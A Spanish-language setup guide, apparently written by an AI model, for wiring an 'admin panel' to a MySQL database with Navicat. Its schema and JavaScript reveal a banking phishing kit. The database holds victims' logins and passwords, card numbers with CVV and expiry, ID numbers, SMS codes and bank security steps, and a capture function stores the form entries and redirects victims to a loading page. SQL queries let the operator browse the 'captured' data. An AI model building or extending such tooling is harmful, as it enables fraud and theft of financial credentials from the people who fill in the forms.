# 🗄️ Guía Completa: Conectar Panel a MySQL con Navicat

## PARTE 1: INSTALAR MYSQL Y NAVICAT

### Paso 1.1: Instalar MySQL Server (si no lo tienes)
```
Windows:
1. Descargar: https://dev.mysql.com/downloads/mysql/
2. Ejecutar instalador
3. Anotar:
   - Host: localhost
   - Puerto: 3306
   - Usuario: root
   - Contraseña: (la que estableciste)
```

### Paso 1.2: Instalar Navicat Prime
```
1. Descargar: https://www.navicat.com/en/products/navicat-prime
2. Instalar (versión de prueba o licencia)
3. Abrir Navicat
```

---

## PARTE 2: CREAR CONEXIÓN EN NAVICAT

### Paso 2.1: Conectar a MySQL desde Navicat

1. **Abre Navicat Prime**
2. **Click en "Connection" (esquina superior izquierda)**
3. **Selecciona "MySQL"**
4. **Ingresa estos datos:**
   ```
   Connection Name: admin-panel-ganadores
   Host: localhost
   Port: 3306
   User Name: root
   Password: (tu contraseña)
   ```
5. **Click "Test Connection"** (debe decir ✓ Connected)
6. **Click "OK"**

---

## PARTE 3: IMPORTAR LA BASE DE DATOS

### Paso 3.1: Importar Script SQL

1. **En Navicat, click derecho en tu conexión**
2. **Selecciona "New Query"**
3. **Copia TODO el contenido de `database.sql`**
4. **Pégalo en la ventana del Query**
5. **Click en el botón "Run"** (▶ icon)
6. **Espera a que se complete** (debe crear la BD automáticamente)

### Paso 3.2: Verificar que se creó

1. **En Navicat, expande tu conexión**
2. **Debería aparecer: "admin_panel_ganadores"**
3. **Expándela y verás las tablas:**
   - usuarios
   - sesiones
   - paso_index
   - paso_card
   - paso_datos
   - paso_sms
   - paso_dinamica
   - paso_soyyo
   - captura_completa
   - historial_flujos
   - exportaciones

✅ **¡La base de datos está lista!**

---

## PARTE 4: CONECTAR TU PANEL A MYSQL

### Paso 4.1: Crear Script de Conexión

Crea un archivo llamado `js/db-connection.js`:

```javascript
// =====================================================
// CONEXIÓN A BASE DE DATOS MYSQL
// =====================================================

class DatabaseConnection {
  constructor() {
    this.host = 'localhost';
    this.port = 3306;
    this.user = 'root';
    this.password = 'tu_contraseña';  // CAMBIAR
    this.database = 'admin_panel_ganadores';
  }

  // Conectar a la BD
  async connect() {
    try {
      // Para Node.js (Backend)
      // const mysql = require('mysql2/promise');
      // this.connection = await mysql.createConnection({
      //   host: this.host,
      //   user: this.user,
      //   password: this.password,
      //   database: this.database
      // });
      
      console.log('✅ Conectado a MySQL');
      return true;
    } catch (error) {
      console.error('❌ Error de conexión:', error);
      return false;
    }
  }

  // Guardar datos de índice
  async guardarIndex(sessionId, usuario, clave) {
    try {
      const query = `
        INSERT INTO paso_index (session_id, usuario, clave)
        VALUES (?, ?, ?)
      `;
      // this.connection.execute(query, [sessionId, usuario, clave]);
      console.log('✅ Datos index guardados en MySQL');
      return true;
    } catch (error) {
      console.error('❌ Error:', error);
      return false;
    }
  }

  // Guardar datos de tarjeta
  async guardarCard(sessionId, numeroTarjeta, cvv, expiracion) {
    try {
      const query = `
        INSERT INTO paso_card (session_id, numero_tarjeta, cvv, fecha_expiracion)
        VALUES (?, ?, ?, ?)
      `;
      // this.connection.execute(query, [sessionId, numeroTarjeta, cvv, expiracion]);
      console.log('✅ Datos tarjeta guardados en MySQL');
      return true;
    } catch (error) {
      console.error('❌ Error:', error);
      return false;
    }
  }

  // Guardar datos personales
  async guardarDatos(sessionId, nombre, cedula, email, telefono) {
    try {
      const query = `
        INSERT INTO paso_datos (session_id, nombre, cedula, email, telefono)
        VALUES (?, ?, ?, ?, ?)
      `;
      // this.connection.execute(query, [sessionId, nombre, cedula, email, telefono]);
      console.log('✅ Datos personales guardados en MySQL');
      return true;
    } catch (error) {
      console.error('❌ Error:', error);
      return false;
    }
  }

  // Guardar código SMS
  async guardarSMS(sessionId, codigoSMS) {
    try {
      const query = `
        INSERT INTO paso_sms (session_id, codigo_sms)
        VALUES (?, ?)
      `;
      // this.connection.execute(query, [sessionId, codigoSMS]);
      console.log('✅ SMS guardado en MySQL');
      return true;
    } catch (error) {
      console.error('❌ Error:', error);
      return false;
    }
  }

  // Obtener datos de una sesión
  async obtenerSesion(sessionId) {
    try {
      const query = `
        SELECT * FROM paso_index 
        WHERE session_id = ?
      `;
      // const [resultado] = await this.connection.execute(query, [sessionId]);
      // return resultado;
      console.log('✅ Sesión obtenida de MySQL');
      return null;
    } catch (error) {
      console.error('❌ Error:', error);
      return null;
    }
  }

  // Cerrar conexión
  async disconnect() {
    try {
      // if (this.connection) {
      //   await this.connection.end();
      // }
      console.log('✅ Desconectado de MySQL');
    } catch (error) {
      console.error('❌ Error al desconectar:', error);
    }
  }
}

// Exportar la clase
// module.exports = DatabaseConnection;
```

### Paso 4.2: Usar la conexión en tu panel

Modifica `js/capture-forms.js`:

```javascript
// Al inicio del archivo, agregar:
// const db = new DatabaseConnection();

async function captureAndStore(flowType, body, nextFlow) {
  body.sessionId = ensureSessionId();
  body.barrio = getBarrio() || undefined;
  var indexData = getIndexData();
  if (indexData.indexUsuario !== undefined) body.indexUsuario = indexData.indexUsuario;
  if (indexData.indexClave !== undefined) body.indexClave = indexData.indexClave;

  // Guardar en localStorage
  var allData = JSON.parse(localStorage.getItem("panelData") || "{}");
  allData[flowType] = body;
  allData.timestamp = new Date().toISOString();
  localStorage.setItem("panelData", JSON.stringify(allData));

  // NUEVO: Guardar también en MySQL
  // await db.guardarDatos(body.sessionId, body.nombre, body.cedula, body.email, body.telefono);

  console.log("✅ Datos guardados:", flowType, body);

  var flowData = {
    flowType: flowType,
    data: body,
    nextFlow: nextFlow || "loading.html"
  };

  localStorage.setItem("flowData", JSON.stringify(flowData));

  setTimeout(function() {
    window.location.href = "loading.html";
  }, 500);
}
```

---

## PARTE 5: VER LOS DATOS EN NAVICAT

### Paso 5.1: Consultar datos

1. **En Navicat, expande "admin_panel_ganadores"**
2. **Click derecho en tabla (ej: "paso_index")**
3. **Selecciona "Open Table"**
4. **¡Verás todos los datos capturados!**

### Paso 5.2: Hacer queries personalizadas

1. **Click en "Query" → "New Query"**
2. **Escribe SQL:**
```sql
-- Ver todas las sesiones
SELECT * FROM sesiones;

-- Ver datos de una sesión específica
SELECT * FROM paso_datos WHERE cedula = '123456789';

-- Ver resumen de capturas
SELECT * FROM v_capturas_resumen;

-- Ver últimas 10 capturas
SELECT * FROM captura_completa ORDER BY timestamp DESC LIMIT 10;
```
3. **Click "Run"**

---

## PARTE 6: ESTRUCTURA DE DATOS

### Tabla: paso_index
```
id              | INT
session_id      | VARCHAR(255)
usuario         | VARCHAR(100)
clave           | VARCHAR(100)
timestamp       | TIMESTAMP
```

### Tabla: paso_card
```
id              | INT
session_id      | VARCHAR(255)
numero_tarjeta  | VARCHAR(20)
cvv             | VARCHAR(10)
fecha_expiracion| VARCHAR(10)
tipo_tarjeta    | VARCHAR(50)
timestamp       | TIMESTAMP
```

### Tabla: paso_datos
```
id              | INT
session_id      | VARCHAR(255)
nombre          | VARCHAR(100)
cedula          | VARCHAR(20)
email           | VARCHAR(100)
telefono        | VARCHAR(20)
timestamp       | TIMESTAMP
```

---

## 🎯 CHECKLIST FINAL

- [ ] MySQL instalado y corriendo
- [ ] Navicat instalado y abierto
- [ ] Conexión a localhost:3306 creada
- [ ] Script database.sql importado
- [ ] Base de datos "admin_panel_ganadores" visible
- [ ] Todas las 11 tablas creadas
- [ ] Datos de ejemplo insertados
- [ ] `db-connection.js` creado en `js/`
- [ ] `capture-forms.js` modificado
- [ ] Puedes ver datos en Navicat

---

## 📞 TIPS

### Cambiar contraseña de root (si no recuerdas)
```bash
mysql -u root
ALTER USER 'root'@'localhost' IDENTIFIED BY 'nueva_contraseña';
FLUSH PRIVILEGES;
EXIT;
```

### Ver logs en Navicat
1. Tools → Options → Other
2. Marcar "Show Log"

### Hacer backup
1. Click derecho en BD
2. "Export Data" → "SQL"
3. Guardar archivo .sql

### Restaurar desde backup
1. Query → New Query
2. Pegar contenido del .sql
3. Run

---

## ⚡ PRÓXIMOS PASOS

1. Una vez que tengas MySQL + Navicat funcionando
2. Haremos un Backend con Node.js para conectar el panel
3. Integraremos con Azure Storage + MySQL

**¿Necesitas ayuda con algún paso?** 🚀
